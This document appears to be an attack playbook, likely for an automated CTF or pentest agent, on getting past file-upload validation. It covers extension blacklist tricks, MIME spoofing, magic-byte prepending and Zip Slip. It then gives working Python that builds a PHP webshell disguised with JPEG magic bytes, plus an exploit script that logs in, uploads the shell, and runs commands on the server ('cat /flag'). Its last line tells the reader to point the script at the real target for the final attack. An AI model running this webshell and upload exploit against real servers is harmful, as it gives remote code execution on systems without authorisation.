# Upload Bypass Patterns Reference

## Validation Bypass Categories

### 1. Extension Blacklist (not whitelist)
```python
# Source: if ext in ['.php', '.exe']: reject
# Bypass: .php5, .phtml, .phar, .PHP, .php%00.jpg
```

### 2. MIME Type Check (Content-Type header only)
```python
# Source: if request.files['file'].content_type != 'image/jpeg': reject
# Bypass: send Content-Type: image/jpeg with PHP content
```

### 3. Magic Bytes Check
```python
# Source: if file.read(4) != b'\xff\xd8\xff\xe0': reject  # JPEG magic
# Bypass: prepend JPEG magic bytes before webshell content
```

### 4. Extension Whitelist + Execution Context
```python
# Source: if ext not in ['.jpg', '.png', '.gif']: reject
# BUT: server executes .jpg as PHP (misconfigured Apache/Nginx)
# OR: uploaded file path gets template-rendered → SSTI
```

### 5. Zip Slip
```python
# Source: ZipFile.extractall(upload_dir) without path sanitization
# Bypass: zip entry with ../../../app/shell.php path
```

### 6. No Validation — upload webshell directly
```

---

## Isolation Test

```python
# /tmp/aurelinth/test_upload_isolation.py
import os

def validate_extension(filename):
    ext = filename.rsplit('.', 1)[-1].lower()  # from source
    BLACKLIST = ['php', 'exe', 'sh']            # from source
    return ext not in BLACKLIST

test_files = [
    "shell.php5",
    "shell.phtml",
    "shell.phar",
    "shell.PHP",
    "shell.php.jpg",
]
for f in test_files:
    result = validate_extension(f)
    print(f"{f}: {'PASS (BYPASS)' if result else 'blocked'}")
```

---

## Craft Malicious File

```python
# /tmp/aurelinth/craft_payload.py

# Simple PHP webshell
webshell = b'<?php system($_GET["cmd"]); ?>'

# If magic bytes check required, prepend JPEG magic
jpeg_magic = b'\xff\xd8\xff\xe0' + b'\x00' * 12
payload = jpeg_magic + webshell

# Write with bypass extension
with open("/tmp/aurelinth/shell.php5", "wb") as f:
    f.write(payload)

print("Payload written: /tmp/aurelinth/shell.php5")
```

---

## Upload Exploit Script

```python
# /tmp/aurelinth/exploit_upload.py
import requests

BASE = "http://LOCAL_TARGET"
s = requests.Session()
s.post(f"{BASE}/login", data={"username":"pwn","password":"pwn"})

# Upload webshell — adjust filename and MIME as needed
with open("/tmp/aurelinth/shell.php5", "rb") as f:
    r = s.post(f"{BASE}/upload", files={
        "file": ("shell.php5", f, "image/jpeg")  # spoof MIME if needed
    })
print("Upload:", r.status_code, r.text[:200])

# Access webshell — adjust path from source upload dir
r = s.get(f"{BASE}/uploads/shell.php5?cmd=cat+/flag")
print("RCE:", r.status_code, r.text[:300])
```

Change `BASE` to real target URL for final attack.
